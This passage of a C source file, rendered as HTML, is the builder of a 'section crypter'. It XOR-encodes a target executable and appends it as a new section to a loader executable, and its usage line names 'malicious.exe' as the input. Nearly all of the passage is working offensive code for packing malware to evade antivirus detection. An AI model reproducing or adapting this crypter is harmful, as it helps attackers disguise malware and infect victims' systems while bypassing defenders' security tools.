return&nbsp;target_addr&nbsp;+&nbsp;(curr_value&nbsp;/&nbsp;align_value&nbsp;+&nbsp;1)&nbsp;*&nbsp;align_value;<br />}<br /><br />/*<br />Add&nbsp;a&nbsp;new&nbsp;section&nbsp;to&nbsp;the&nbsp;end&nbsp;of&nbsp;a&nbsp;PE&nbsp;file<br />and&nbsp;write&nbsp;the&nbsp;modified&nbsp;PE&nbsp;out&nbsp;to&nbsp;a&nbsp;new&nbsp;file.<br />Written&nbsp;as&nbsp;1&nbsp;large&nbsp;function&nbsp;because&nbsp;it&nbsp;makes&nbsp;resizing&nbsp;the&nbsp;PE&nbsp;buffer&nbsp;to&nbsp;store&nbsp;the&nbsp;new&nbsp;data&nbsp;easier.<br /><br />Parameters:<br />	char*&nbsp;pe_infile&nbsp;-&nbsp;file&nbsp;path&nbsp;to&nbsp;the&nbsp;PE&nbsp;file&nbsp;to&nbsp;open<br />	char*&nbsp;pe_outfile&nbsp;-&nbsp;path&nbsp;of&nbsp;the&nbsp;new&nbsp;PE&nbsp;to&nbsp;write&nbsp;out<br />	void*&nbsp;data_buf&nbsp;-&nbsp;the&nbsp;data&nbsp;to&nbsp;add&nbsp;to&nbsp;the&nbsp;section<br />	DWORD&nbsp;data_size&nbsp;-&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;data&nbsp;to&nbsp;add<br />	char*&nbsp;new_sectionname&nbsp;-&nbsp;name&nbsp;of&nbsp;the&nbsp;new&nbsp;section<br />*/<br />BOOL&nbsp;AppendSectionToPEFile(char*&nbsp;pe_infile,&nbsp;char*&nbsp;pe_outfile,&nbsp;char*&nbsp;data_buf,&nbsp;DWORD&nbsp;data_size,&nbsp;char*&nbsp;new_sectionname)<br />{<br />	BOOL&nbsp;ok&nbsp;=&nbsp;TRUE;<br />	BOOL&nbsp;b&nbsp;=&nbsp;FALSE;<br /><br />	//&nbsp;Open&nbsp;target&nbsp;PE&nbsp;file&nbsp;&amp;&nbsp;read&nbsp;into&nbsp;buffer<br />	HANDLE&nbsp;h_infile&nbsp;=&nbsp;NULL;<br />	HANDLE&nbsp;h_outfile&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;pe_size&nbsp;=&nbsp;0;<br />	void*&nbsp;pe_buf&nbsp;=&nbsp;NULL;<br /><br />	h_infile&nbsp;=&nbsp;CreateFileA(pe_infile,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_infile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;PE&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	pe_size&nbsp;=&nbsp;GetFileSize(h_infile,&nbsp;NULL);<br />	pe_buf&nbsp;=&nbsp;malloc(pe_size);<br />	b&nbsp;=&nbsp;ReadFile(h_infile,&nbsp;pe_buf,&nbsp;pe_size,&nbsp;NULL,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;into&nbsp;buffer:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;Check&nbsp;it&#39;s&nbsp;a&nbsp;valid&nbsp;PE<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)pe_buf;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((size_t)pe_buf&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br />	PIMAGE_SECTION_HEADER&nbsp;section&nbsp;=&nbsp;IMAGE_FIRST_SECTION(pe_header);<br />	PIMAGE_SECTION_HEADER&nbsp;last_section&nbsp;=&nbsp;(IMAGE_FIRST_SECTION(pe_header)&nbsp;+&nbsp;pe_header-&gt;FileHeader.NumberOfSections)&nbsp;-&nbsp;1;<br />	PIMAGE_SECTION_HEADER&nbsp;new_section&nbsp;=&nbsp;last_section&nbsp;+&nbsp;1;<br /><br />	if&nbsp;(dos_header-&gt;e_magic&nbsp;!=&nbsp;IMAGE_DOS_SIGNATURE)<br />	{<br />		printf(&quot;[-]&nbsp;PE&nbsp;infile&nbsp;not&nbsp;a&nbsp;valid&nbsp;DOS&nbsp;file&nbsp;\n&quot;);<br />		goto&nbsp;cleanup;<br />	}<br />	if&nbsp;(pe_header-&gt;Signature&nbsp;!=&nbsp;IMAGE_NT_SIGNATURE)<br />	{<br />		printf(&quot;[-]&nbsp;infile&nbsp;is&nbsp;not&nbsp;a&nbsp;valid&nbsp;PE&nbsp;file&nbsp;\n&quot;);<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;Write&nbsp;new&nbsp;section&nbsp;info&nbsp;into&nbsp;PE&nbsp;header<br />	memset(new_section,&nbsp;0,&nbsp;sizeof(IMAGE_SECTION_HEADER));<br />	memcpy_s(new_section-&gt;Name,&nbsp;8,&nbsp;new_sectionname,&nbsp;8);		//&nbsp;max&nbsp;section&nbsp;name&nbsp;length&nbsp;is&nbsp;8&nbsp;bytes<br />	new_section-&gt;Misc.VirtualSize&nbsp;=&nbsp;align(data_size,&nbsp;pe_header-&gt;OptionalHeader.SectionAlignment,&nbsp;0);<br />	new_section-&gt;VirtualAddress&nbsp;=&nbsp;align(last_section-&gt;Misc.VirtualSize,&nbsp;pe_header-&gt;OptionalHeader.SectionAlignment,&nbsp;last_section-&gt;VirtualAddress);<br />	new_section-&gt;SizeOfRawData&nbsp;=&nbsp;align(data_size,&nbsp;pe_header-&gt;OptionalHeader.FileAlignment,&nbsp;0);<br />	new_section-&gt;PointerToRawData&nbsp;=&nbsp;align(last_section-&gt;SizeOfRawData,&nbsp;pe_header-&gt;OptionalHeader.FileAlignment,&nbsp;last_section-&gt;PointerToRawData);<br />	new_section-&gt;Characteristics&nbsp;=&nbsp;IMAGE_SCN_CNT_INITIALIZED_DATA&nbsp;|&nbsp;IMAGE_SCN_MEM_READ;;<br /><br />	//&nbsp;Update&nbsp;PE&nbsp;header&nbsp;with&nbsp;+1&nbsp;section&nbsp;and&nbsp;increased&nbsp;size<br />	pe_header-&gt;FileHeader.NumberOfSections&nbsp;+=&nbsp;1;<br />	pe_header-&gt;OptionalHeader.SizeOfImage&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.SizeOfImage&nbsp;+&nbsp;data_size;<br /><br />	/*<br />	Resize&nbsp;PE&nbsp;buffer&nbsp;to&nbsp;store&nbsp;new&nbsp;data<br />	New&nbsp;size&nbsp;should&nbsp;be&nbsp;(pe_size&nbsp;+&nbsp;data_size&nbsp;after&nbsp;alignment)<br />	(pe_size&nbsp;+&nbsp;data_size)&nbsp;doesn&#39;t&nbsp;allocate&nbsp;enough&nbsp;space.<br />	Therefore,&nbsp;SizeOfRawData&nbsp;is&nbsp;used&nbsp;because&nbsp;it&#39;s&nbsp;aligned.<br />	*/<br />	DWORD&nbsp;final_pe_size&nbsp;=&nbsp;pe_size&nbsp;+&nbsp;new_section-&gt;SizeOfRawData;<br />	void*&nbsp;tmp_pointer&nbsp;=&nbsp;realloc(pe_buf,&nbsp;final_pe_size);<br />	if&nbsp;(tmp_pointer&nbsp;==&nbsp;NULL)<br />		goto&nbsp;cleanup;<br />	else<br />		pe_buf&nbsp;=&nbsp;tmp_pointer;<br /><br />	//&nbsp;Write&nbsp;data&nbsp;into&nbsp;new&nbsp;section<br />	void*&nbsp;rawdata_addr&nbsp;=&nbsp;(void*)((size_t)pe_buf&nbsp;+&nbsp;new_section-&gt;PointerToRawData);<br />	memset(rawdata_addr,&nbsp;0,&nbsp;new_section-&gt;SizeOfRawData);<br />	memcpy_s(rawdata_addr,&nbsp;new_section-&gt;SizeOfRawData,&nbsp;data_buf,&nbsp;data_size);<br /><br />	//&nbsp;Write&nbsp;buffer&nbsp;out&nbsp;to&nbsp;new&nbsp;file<br />	h_outfile&nbsp;=&nbsp;CreateFileA(pe_outfile,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_outfile&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;output&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />	DWORD&nbsp;bytes_written&nbsp;=&nbsp;0;<br />	b&nbsp;=&nbsp;WriteFile(h_outfile,&nbsp;pe_buf,&nbsp;final_pe_size,&nbsp;&amp;bytes_written,&nbsp;NULL);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;buffer&nbsp;out&nbsp;to&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		ok&nbsp;=&nbsp;FALSE;<br />		goto&nbsp;cleanup;<br />	}<br /><br />cleanup:<br />	if&nbsp;(h_infile)&nbsp;CloseHandle(h_infile);<br />	if&nbsp;(h_outfile)&nbsp;CloseHandle(h_outfile);<br />	if&nbsp;(pe_buf)&nbsp;free(pe_buf);<br /><br />	return&nbsp;ok;<br />}<br /><br />int&nbsp;main(int&nbsp;argc,&nbsp;char*&nbsp;argv[])<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;b&nbsp;=&nbsp;FALSE;<br /><br />	printf(&quot;#&nbsp;SECTION&nbsp;CRYPTER&nbsp;-&nbsp;builder&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;if&nbsp;crypting&nbsp;a&nbsp;32bit&nbsp;.exe,&nbsp;use&nbsp;the&nbsp;32bit&nbsp;builder&nbsp;and&nbsp;32bit&nbsp;base.exe&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;if&nbsp;crypting&nbsp;a&nbsp;64bit&nbsp;.exe,&nbsp;use&nbsp;the&nbsp;64bit&nbsp;builder&nbsp;and&nbsp;64bit&nbsp;base.exe&nbsp;\n\n&quot;);<br /><br />	if&nbsp;(argc&nbsp;!=&nbsp;4)<br />	{<br />		printf(&quot;[!]&nbsp;not&nbsp;enough&nbsp;arguments&nbsp;\n&quot;);<br />		printf(&quot;usage:&nbsp;&lt;/path/to/target/pe.exe&gt;&nbsp;&lt;/path/to/loader.exe&gt;&nbsp;&lt;/path/to/outfile.exe&gt;&nbsp;\n&quot;);<br />		printf(&quot;examp:&nbsp;malicious.exe&nbsp;loader.exe&nbsp;C:\\Users\\Bob\\Desktop\\crypted.exe&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	char*&nbsp;crypt_target&nbsp;=&nbsp;argv[1];<br />	char*&nbsp;base_file&nbsp;=&nbsp;argv[2];<br />	char*&nbsp;outfile&nbsp;=&nbsp;argv[3];<br /><br />	DWORD&nbsp;data_size&nbsp;=&nbsp;0;<br />	void*&nbsp;data&nbsp;=&nbsp;ReadFileIntoBuffer(crypt_target,&nbsp;&amp;data_size);<br />	if&nbsp;(data&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;to&nbsp;be&nbsp;crypted&nbsp;into&nbsp;buffer&nbsp;\n&quot;);<br />		return&nbsp;1;<br />	}<br /><br />	xor_bytes(data,&nbsp;data_size);<br /><br />	b&nbsp;=&nbsp;AppendSectionToPEFile(base_file,&nbsp;outfile,&nbsp;data,&nbsp;data_size,&nbsp;SECTION_NAME);<br />	if&nbsp;(b&nbsp;==&nbsp;FALSE)<br />		return&nbsp;1;<br /><br />	printf(&quot;[+]&nbsp;done!&nbsp;\n&quot;);<br />	printf(&quot;[*]&nbsp;added&nbsp;%s&nbsp;to&nbsp;%s&nbsp;\n&quot;,&nbsp;SECTION_NAME,&nbsp;outfile);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div></div>
</body>
</html>
